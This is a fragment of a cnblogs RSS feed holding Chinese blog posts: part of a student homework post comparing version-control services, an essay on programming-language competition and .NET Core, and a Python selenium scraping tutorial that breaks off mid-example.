&lt;ul&gt;&lt;li&gt;曾经，现代计算机之父冯诺依曼，表示在计算机上编写程序是没有意义的事情，应当花时间在硬件上。&lt;strong&gt;然后，软件时代就到来了&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，比尔盖茨表示，64KB内存足以应对世界上一切的程序需求。&lt;strong&gt;然后，2000年前后的内存都是上百MB的级别&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，人们认为，两位十进制数表示年份，肯定是够的。&lt;strong&gt;然后，2000年如期而至&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，人们也以为，timestamp弄个C语言的int32类型，就铁定够用了。&lt;strong&gt;然后，2038年也不远了&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，人们也认为，MD5是永久坚不可催的。&lt;strong&gt;然后，现在的MD5在存储海量数据的撞库面前根本不堪一击，用MD5加密的网站密码，已经属于可以轻松破解的类型了。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;于是乎，在历史的进程下，之后人们还会面对哪些曾经呢？让我们拭目以待吧。&lt;/p&gt;
&lt;h2 id=&quot;项目管理软件&quot;&gt;项目管理软件&lt;/h2&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;12&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;5&quot;&gt;&lt;td&gt;git&lt;/td&gt;
&lt;td&gt;1、功能齐全&lt;br/&gt;2、支持各种复杂情况的代码管理&lt;br/&gt;3、与现代开发中的团队协作相性优秀&lt;br/&gt;4、主流版本控制，各大网站支持丰富&lt;/td&gt;
&lt;td&gt;1、原生git为纯命令行，对新手不算太友好&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;5&quot;&gt;&lt;td&gt;svn&lt;/td&gt;
&lt;td&gt;1、图形界面&lt;br/&gt;2、与windows相性良好&lt;/td&gt;
&lt;td&gt;1、图形界面（没错，这也是缺点）&lt;br/&gt;2、功能面不如git，没有git一样高的可玩性&lt;br/&gt;3、整体生态远远不如git&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;Github&lt;/td&gt;
&lt;td&gt;1、开源代码多，群众基础强大&lt;br/&gt;2、操作简单，即上即用&lt;/td&gt;
&lt;td&gt;1、（天朝限定）速度慢&lt;br/&gt;2、私有仓库是收费的&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;5&quot;&gt;&lt;td&gt;BitBucket&lt;/td&gt;
&lt;td&gt;1、私有仓库无限制&lt;br/&gt;2、功能丰富，专为团队开发设计&lt;/td&gt;
&lt;td&gt;1、（天朝限定）速度慢&lt;br/&gt;2、没有太多开源代码（至少远远比不上github）&lt;br/&gt;3、代码闭源&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;5&quot;&gt;&lt;td&gt;Gitlab&lt;/td&gt;
&lt;td&gt;1、代码开源，自行安装，自行配置&lt;br/&gt;2、完善的团队协作支持&lt;br/&gt;3、（天朝限定）速度快&lt;br/&gt;4、完美的ci支持&lt;/td&gt;
&lt;td&gt;1、私有的gitlab基本不存在开源代码&lt;br/&gt;2、免费版只提供部分功能&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</description>
<pubDate>Mon, 04 Mar 2019 15:05:00 +0000</pubDate>
<dc:creator>HansBug</dc:creator>
<og:description>概述 | 项目 | 内容 | | : : | : : | | 本次作业所属课程 | '2019BUAA软件工程 周二班' | | 本次作业要求 | '第1次个人作业' 当然，比这个更重要百倍的还是实实</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/HansBug/p/10473959.html</dc:identifier>
</item>
<item>
<title>开发语言大爆炸的时代，究竟谁主沉浮？ - 溪源More</title>
<link>http://www.cnblogs.com/xiyuanMore/p/10473944.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiyuanMore/p/10473944.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;开发语言大爆炸的时代，究竟谁主沉浮？&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　&lt;span&gt;当这个系列本来打算是写人物的，而且是写我们身边那些优秀的开发者，然而当第一篇文章，写的是&lt;a href=&quot;https://www.cnblogs.com/xiyuanMore/p/10445986.html&quot; target=&quot;_blank&quot;&gt;关于我们长沙.NET社区的优秀开发者邹琼俊&lt;/a&gt;，发表在博客园之后，有一位也是昔日.NET 开发者、今天优秀的Java工程师给我留言，他说多年一来，一直紧跟着那些优秀的开发者，包括Learning Hard，王清培，还有陆敏技等等，都是C#领域的大牛，都出版过图书，并一度以他们为榜样，期待成为他们那样优秀的开发者。然而，后来这些优秀的开发者，哪怕他们出版了不少书籍，现在都不再以.NET 开发作为主要的语言方向，而是使用Java进行开发。（当然，他们转语言是几年前，那个时候还没.NetCore这个好东西。）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      我个人认为，那些能够出版书籍的优秀开发者，他们昔日是我们学习的榜样，他们今天依然是我们学习的榜样，他们的优秀，不仅仅是C#或.NET的骄傲，而是整个中国开发者团体的骄傲。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      在.NET体系语言的学习过程中，他们表现出来的才华，既成就了自己，也成就了他人。除此之外，通过.NET体系语言的学习，一通而百通，也让他们学习其他语言的过程更加的便捷。尤其是一开始接触的是C#这种设计优雅的语言，更是如此，C#的学习过程，让他们从C#开发者转到Java 开发者的过程中，往往并不需要花费太大的精力就可以轻松上手，游刃有余，下笔如有神。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      语言的转换与否，尤其是C#转java，更是司空见惯，老生长谈，仅仅一个语言之争，在今年年初就掀起了几波论战最终无疾而终。其实想起来，总觉得没什么意义。该做决策的人不会看这些文章，经济基础决定上层建筑，仅此而已。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      当今时代，不仅仅是知识大爆炸的年代，也可以说是开发语言大爆发的时代。每一种开发语言体系，都并非是一个大而全、无懈可击的语言体系。优秀如C#，把VB 给革命了，优秀如Java 把C++给革命了，php自以为它把Java和C#革命了，然后Go 语言又出来了。当大家以为语言的发展方向基本上已经稳固的时候，Python和Nodejs 这两种经典而优秀的语言又逆势崛起，创造了一系列奇迹，紧接着还有Kotlin等一干毫不逊色的新兴语言翘首期盼。后端语言群雄逐鹿，移动端语言同样竞争激烈，java看起来一统安卓市场，却早就触及了甲骨文的逆鳞，当然谷歌公司早就给自己留了后路，像dart等语言就是为它准备的。除此之外，ng，react，vue等新三大开发框架也恨不能从大蛋糕中切去一大块，而他们似乎还取得了不错的进展。开发语言市场竞争是如此的激烈，毕竟关系到大几百万开发语言的拥趸们吃饭的家伙，市场大就饭好吃，市场小就吃冷饭。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8NvSUuJdGAfjjk7oVua14fU1L6lKwE5ibicFzsDplPiaaqLCMuIQw8J9NZQ/640?wx_fmt=png&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; alt=&quot;&quot; data-copyright=&quot;0&quot; data-ratio=&quot;1.0211267605633803&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8NvSUuJdGAfjjk7oVua14fU1L6lKwE5ibicFzsDplPiaaqLCMuIQw8J9NZQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;568&quot; data-fail=&quot;0&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   然而，真的有独一无二的开发语言么？真的有什么语言能一统江湖，无所不能？不存在的，这辈子都不可能的，万万都不可能。唯一的判定标准，大概只有金钱这一种衡量条件而已。然而风水轮流转，今年到你家，明年到谁家？没人能预知未来的发展。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     程序员们喜欢自嘲为码农，而这些优秀的语言，则正是我们的赖以为生的宝贵砖头。今天，那么多优秀的语言，打造出了许许多多优秀的基础设施，而如何灵活的运用的这些基础设施，为企业的快速发展提供了极大的便利，也带来了无穷挑战。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   任何语言或技术都有他的精华和魅力所在，优秀的语言各有各的不同，但是又各有各的相似，坚持下去，持续几年的付出，还有什么学不会的？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    尤其是.NET Core这种优秀的技术体系，更是如此，此刻的它，正是那含苞待放的鲜花，只要假以时日，必定芳香四溢，满园流芳，并令世人瞩目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8N4CzD94FgFsbEUMqcdcp7PaPuPjkLhAJXX4n9wLqe8Bz24D2jxbnMtg/640?wx_fmt=jpeg&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; alt=&quot;&quot; data-copyright=&quot;0&quot; data-ratio=&quot;1&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8N4CzD94FgFsbEUMqcdcp7PaPuPjkLhAJXX4n9wLqe8Bz24D2jxbnMtg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;500&quot; data-fail=&quot;0&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　为了防止引起大家的不适，我把硬广写在评论里面了。。      &lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 14:58:00 +0000</pubDate>
<dc:creator>溪源More</dc:creator>
<og:description>开发语言大爆炸的时代，究竟谁主沉浮？ 当这个系列本来打算是写人物的，而且是写我们身边那些优秀的开发者，然而当第一篇文章，写的是关于我们长沙.NET社区的优秀开发者邹琼俊，发表在博客园之后，有一位也是昔</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiyuanMore/p/10473944.html</dc:identifier>
</item>
<item>
<title>爬虫之selenium模块 - W的一天</title>
<link>http://www.cnblogs.com/12345huangchun/p/10473812.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/12345huangchun/p/10473812.html</guid>
<description>&lt;h2&gt;　　一、selenium模块&lt;/h2&gt;
&lt;p&gt;　　之前，我们爬虫是模拟浏览器，但始终不是用的浏览器，但今天我们要说的是另一种爬虫方式，这次不是模拟浏览器，而是用程序去控制浏览器进行一些列操作，也就是selenium。selenium是python的一个第三方库，对外提供的接口可以操控浏览器，比如说输入、点击，跳转，下拉等动作。&lt;/p&gt;
&lt;p&gt;　　在使用selenium模块之前要做两件事，一是安装selenium模块，可以用终端用pip，也可以在pycharm里的setting安装；二是我们需要下载一款浏览器驱动程序，下载的驱动程序要和浏览器的版本一致&lt;/p&gt;
&lt;h2&gt;　　二、用谷歌驱动程序来展示selenium模块的用法&lt;/h2&gt;
&lt;h3&gt;　　1，下载谷歌浏览器的驱动程序&lt;/h3&gt;
&lt;p&gt;　　下载地址：http://chromedriver.storage.googleapis.com/index.html，下载驱动程序要和浏览器版本统一，可以在这个网址看该选择哪个版本，直接在网上搜索谷歌浏览器版本与驱动程序版本映射表就可以了。如我的谷歌浏览器是最新的72版。&lt;/p&gt;
&lt;p&gt;　　网上的映射图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1519076/201903/1519076-20190304204028259-821013703.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　所以我选择一个v2.45的驱动程序，去驱动程序下载页面选择v2.45,点击，如果是windows系统的，选择32位是可以用（只有32位供你选择）&lt;/p&gt;
&lt;h3&gt;　　2，简单示例&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver&lt;br/&gt;#首先要实例化一个对象，参数为驱动程序所在位置的路径
driver&lt;/span&gt;=webdriver.Chrome(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;E:\Google\Chrome\Application\chromedriver.exe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
driver.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.baidu.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;给input标签赋值&lt;/span&gt;
search=input(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;请输入想要下载的类型，如美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#这是通过id属性找到搜索框标签，并且给他赋值
driver.find_element_by_id(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).send_keys(search)
&lt;/span&gt;&lt;span&gt;#通过id属性找到‘百度一下’点击标签，&lt;/span&gt;&lt;span&gt;可点击事件触发操作&lt;/span&gt;
driver.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;su&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).click()&lt;br/&gt;driver.close()#关闭驱动程序
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　3，找到标签&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;find_element_by_id()    #通过id属性
find_element_by_name()  #通过name属性
find_element_by_class_name()   #通过class名字
find_element_by_tag_name()     #通过标签名字
find_element_by_link_text()    #通过链接标签的文本
find_element_by_partial_link_text()   #通过链接标签的部分文本
find_element_by_xpath()             #通过xpath
find_element_by_css_selector()     #通过css选择器&lt;br/&gt;注意：&lt;br/&gt;1，find_element_by_找到的第一个，find_elements_by_找到的是所有&lt;br/&gt;2，find_element(By.ID,id)和find_element_by_id(id)是一样的&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　4，找到的标签可用方法&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
#这是找到一个搜索框的标签&lt;br/&gt;input=driver.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ww&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#给这个搜索框输入值
input.send_keys(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;myname&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#把搜索框的值给清空
input.clear()&lt;br/&gt;#这是找到一个按钮标签
button&lt;/span&gt;=driver.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cc&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#触发点击事件
button.click()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　5，动作链&lt;/h3&gt;
&lt;p&gt;　　上面的动作只是输入啊，点击等单个动作的实现，其实还有一些连续的动作，比如说鼠标拖动等，这就是一个动作链。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;span&gt;from selenium import&lt;span&gt; webdriver&lt;br/&gt;&lt;em id=&quot;__mceDel&quot;&gt;from selenium.webdriver import&lt;span&gt; ActionChains&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;br/&gt;import&lt;/span&gt;&lt;span&gt; time
browser &lt;/span&gt;=&lt;span&gt; webdriver.Chrome()
url &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser.get(url)&lt;br/&gt;#这是特例，这个页面相当于有两层HTML，这是进入iframeResult的HTML
browser.switch_to.frame(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;iframeResult&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#找到source标签
source &lt;/span&gt;= browser.find_element_by_css_selector(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#draggable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#找到target标签
target &lt;/span&gt;= browser.find_element_by_css_selector(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#droppable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#实例化一个action对象
actions &lt;/span&gt;=&lt;span&gt; ActionChains(browser)&lt;br/&gt;&lt;/span&gt;#点击source标签，然后不放开
&lt;span&gt;actions.click_and_hold(source).perform()&lt;br/&gt;#把刚才点击不放的标签移动到target标签&lt;br/&gt;&lt;/span&gt;&lt;span&gt;actions.move_to_element(target).perform()&lt;br/&gt;#然后再把source标签往x轴方向移动50
actions.move_by_offset(xoffset&lt;/span&gt;=50,yoffset=&lt;span&gt;0).perform()
#这是释放动作链，也就是松开鼠标
actions.release()&lt;/span&gt;&lt;/em&gt;&lt;/em&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　6，执行js代码&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
browser &lt;/span&gt;=&lt;span&gt; webdriver.Chrome()
browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.jd.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#这是滚动页面的滚动条，这个功能是很好用的，我们知道有很多页面刚进入时，是不会加载完全，当你把滚动条不断往下滚动，又会添加更多的信息，&lt;br/&gt;对于爬取这种页面，如果不用这个方法，得到页面是不完全的
browser.execute_script(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;window.scrollTo(0, document.body.scrollHeight)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
browser.execute_script(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;alert(&quot;123&quot;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　7，获取标签的信息&lt;/h3&gt;
&lt;p&gt;　　7.1 拿到页面的源代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
#直接用驱动对象'.page_source'就可以&lt;br/&gt;driver.page_source
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　7.2 直接拿标签的属性&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;from selenium &lt;span class=&quot;hljs-keyword&quot;&gt;import webdriver &lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;from selenium.webdriver.common.by &lt;span class=&quot;hljs-keyword&quot;&gt;import By &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;tag=browser.find_element(By.CSS_SELECTOR,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#cc-lm-tcgShowImgContainer img&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;获取标签属性，&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(tag.get_attribute(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;src&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;获取标签ID，位置，名称，大小（了解）&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.id)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.location)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.tag_name)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(tag.size)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　8，延时等待&lt;/h3&gt;
&lt;p&gt;　　页面加载是分顺序的，很多时候当网速差一点的情况下，就会明显感觉到，先看到是一些html标签，但什么css和js都没有，图片等加载会慢点。所以当我们发送请求后直接拿page_source，不一定能拿到加载完毕的页面，也就拿到源码可能不全，为了确保能拿到完整的源码，有两种等待的方法：一是隐式等待，二是显示等待&lt;/p&gt;
&lt;p&gt;　　8.1 隐式等待&lt;/p&gt;
&lt;p&gt;　　就是等页面加载完毕后在开始查找，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ActionChains
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.by &lt;span&gt;import&lt;/span&gt; By &lt;span&gt;#&lt;/span&gt;&lt;span&gt;按照什么方式查找，By.ID,By.CSS_SELECTOR&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.keys &lt;span&gt;import&lt;/span&gt; Keys &lt;span&gt;#&lt;/span&gt;&lt;span&gt;键盘按键操作&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support &lt;span&gt;import&lt;/span&gt;&lt;span&gt; expected_conditions as EC
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support.wait &lt;span&gt;import&lt;/span&gt; WebDriverWait &lt;span&gt;#&lt;/span&gt;&lt;span&gt;等待页面加载某些元素&lt;/span&gt;
&lt;span&gt;
browser&lt;/span&gt;=&lt;span&gt;webdriver.Chrome()

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;隐式等待:在查找所有元素时，如果尚未被加载，则等10秒&lt;/span&gt;
browser.implicitly_wait(10&lt;span&gt;)

browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.baidu.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag&lt;/span&gt;=browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(Keys.ENTER)

contents&lt;/span&gt;=browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;content_left&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;没有等待环节而直接查找，找不到则会报错&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(contents)

browser.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　8.2 显式等待&lt;/p&gt;
&lt;p&gt;　　只等要查找的标签加载完毕&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ActionChains
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.by &lt;span&gt;import&lt;/span&gt; By &lt;span&gt;#&lt;/span&gt;&lt;span&gt;按照什么方式查找，By.ID,By.CSS_SELECTOR&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.keys &lt;span&gt;import&lt;/span&gt; Keys &lt;span&gt;#&lt;/span&gt;&lt;span&gt;键盘按键操作&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support &lt;span&gt;import&lt;/span&gt;&lt;span&gt; expected_conditions as EC
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support.wait &lt;span&gt;import&lt;/span&gt; WebDriverWait &lt;span&gt;#&lt;/span&gt;&lt;span&gt;等待页面加载某些元素&lt;/span&gt;
&lt;span&gt;
browser&lt;/span&gt;=&lt;span&gt;webdriver.Chrome()
browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.baidu.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


input_tag&lt;/span&gt;=browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(Keys.ENTER)


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;显式等待：显式地等待某个元素被加载&lt;/span&gt;
wait=WebDriverWait(browser,10&lt;span&gt;)
wait.until(EC.presence_of_element_located((By.ID,&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;content_left&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)))

contents&lt;/span&gt;=browser.find_element(By.CSS_SELECTOR,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#content_left&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(contents)


browser.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　9，cookie&lt;/h3&gt;
&lt;p&gt;　　我们知道对于浏览器来说cookie是很重要的，很多情况下服务器都是要对cookie进行验证的&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
 
browser &lt;/span&gt;=&lt;span&gt; webdriver.Chrome()
browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.zhihu.com/explore&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#获取cookie&lt;br/&gt;&lt;/span&gt;&lt;span&gt;browser.get_cookies()&lt;br/&gt;#设置cookie
browser.add_cookie({&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;domain&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;www.zhihu.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;germey&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;})
&lt;/span&gt;&lt;span&gt;#删除cookie
browser.delete_all_cookies()&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　10，异常处理&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.common.exceptions &lt;span&gt;import&lt;/span&gt;&lt;span&gt; TimeoutException,NoSuchElementException,NoSuchFrameException

&lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
    browser&lt;/span&gt;=&lt;span&gt;webdriver.Chrome()
